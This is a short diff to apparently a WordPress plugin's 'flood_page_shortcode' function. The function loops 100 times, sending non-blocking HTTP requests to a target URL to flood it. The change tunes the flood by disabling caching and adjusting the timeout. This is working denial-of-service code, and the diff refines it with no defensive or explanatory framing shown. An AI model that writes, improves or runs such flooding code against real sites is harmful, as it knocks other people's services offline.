@@ -23,7 +23,8 @@ function flood_page_shortcode() {
       // Perform the flood asynchronously
       for ( $i = 0; $i < 100; $i++ ) {
         wp_remote_get( $target_url, array(
-          'timeout' => 0.1,  // Set a short timeout (in seconds)
+          'cache' => false,
+          'timeout' => 1,  // Set a short timeout (in seconds)
           'blocking' => false // Make the request non-blocking
         ) );
       }
